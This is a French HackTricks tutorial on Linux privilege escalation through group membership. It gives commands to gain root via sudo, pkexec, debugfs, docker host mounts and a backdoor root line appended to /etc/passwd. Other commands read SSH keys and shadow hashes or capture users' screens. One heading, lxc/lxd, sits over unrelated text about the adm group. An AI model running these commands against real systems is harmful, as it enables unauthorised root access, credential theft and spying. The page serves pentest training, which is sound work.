# Groupes intéressants - Élévation de privilèges Linux

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Groupes Sudo/Admin

### **PE - Méthode 1**

**Parfois**, **par défaut (ou parce que certains logiciels en ont besoin)** à l'intérieur du fichier **/etc/sudoers**, vous pouvez trouver certaines de ces lignes :
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe sudo ou admin peut exécuter n'importe quoi en tant que sudo**.

Si c'est le cas, pour **devenir root, vous pouvez simplement exécuter**:
```
sudo su
```
### PE - Méthode 2

Trouvez tous les binaires suid et vérifiez s'il y a le binaire **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Si vous constatez que le binaire **pkexec est un binaire SUID** et que vous appartenez au groupe **sudo** ou **admin**, vous pourriez probablement exécuter des binaires en tant que sudo en utilisant `pkexec`.\
Cela est dû au fait que ces groupes sont généralement inclus dans la **politique polkit**. Cette politique identifie essentiellement les groupes autorisés à utiliser `pkexec`. Vérifiez-le avec :
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Vous trouverez ici les groupes autorisés à exécuter **pkexec** et **par défaut** dans certaines distributions Linux, les groupes **sudo** et **admin** apparaissent.

Pour **devenir root, vous pouvez exécuter**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si vous essayez d'exécuter **pkexec** et que vous obtenez cette **erreur**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Ce n'est pas parce que vous n'avez pas les autorisations mais parce que vous n'êtes pas connecté sans GUI**. Et il y a une solution à ce problème ici: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Groupe Wheel

**Parfois**, **par défaut** à l'intérieur du fichier **/etc/sudoers**, vous pouvez trouver cette ligne :
```
%wheel	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe wheel peut exécuter n'importe quoi en tant que sudo**.

Si c'est le cas, pour **devenir root, vous pouvez simplement exécuter**:
```
sudo su
```
## Groupe Shadow

Les utilisateurs du **groupe shadow** peuvent **lire** le fichier **/etc/shadow** :
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Alors, lisez le fichier et essayez de **craquer quelques hachages**.

## Groupe de disque

Ce privilège est presque **équivalent à un accès root** car vous pouvez accéder à toutes les données à l'intérieur de la machine.

Fichiers : `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Notez qu'en utilisant debugfs, vous pouvez également **écrire des fichiers**. Par exemple, pour copier `/tmp/asd1.txt` vers `/tmp/asd2.txt`, vous pouvez faire :
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Cependant, si vous essayez de **modifier des fichiers appartenant à root** (comme `/etc/shadow` ou `/etc/passwd`), vous obtiendrez une erreur "**Permission denied**".

## Groupe Vidéo

En utilisant la commande `w`, vous pouvez trouver **qui est connecté au système** et cela affichera une sortie comme celle-ci :
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Le **tty1** signifie que l'utilisateur **yossi est connecté physiquement** à un terminal sur la machine.

Le groupe **video** a accès pour visualiser la sortie de l'écran. Fondamentalement, vous pouvez observer les écrans. Pour ce faire, vous devez **capturer l'image actuelle à l'écran** en données brutes et obtenir la résolution utilisée par l'écran. Les données de l'écran peuvent être enregistrées dans `/dev/fb0` et vous pouvez trouver la résolution de cet écran sur `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Pour **ouvrir** l'**image brute**, vous pouvez utiliser **GIMP**, sélectionnez le fichier \*\*`screen.raw` \*\* et sélectionnez comme type de fichier **Données d'image brute** :

![](<../../../.gitbook/assets/image (287) (1).png>)

Ensuite, modifiez la largeur et la hauteur pour celles utilisées à l'écran et vérifiez différents types d'images (et sélectionnez celui qui affiche le mieux l'écran) :

![](<../../../.gitbook/assets/image (288).png>)

## Groupe Root

Il semble qu'en **tant que membres du groupe root**, on pourrait avoir accès à la **modification** de certains fichiers de configuration de **services** ou de certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour escalader les privilèges...

**Vérifiez quels fichiers les membres du groupe root peuvent modifier** :
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Groupe Docker

Vous pouvez **monter le système de fichiers racine de la machine hôte sur le volume d'une instance**, de sorte que lorsque l'instance démarre, elle charge immédiatement un `chroot` dans ce volume. Cela vous donne effectivement un accès root sur la machine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Groupe lxc/lxd

Les **membres** du groupe **`adm`** ont généralement des autorisations pour **lire les fichiers journaux** situés dans _/var/log/_.\
Par conséquent, si vous avez compromis un utilisateur de ce groupe, vous devriez certainement **consulter les journaux**.

## Groupe Auth

À l'intérieur d'OpenBSD, le groupe **auth** peut généralement écrire dans les dossiers _**/etc/skey**_ et _**/var/db/yubikey**_ s'ils sont utilisés.\
Ces autorisations peuvent être exploitées avec l'exploit suivant pour **escalader les privilèges** vers root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
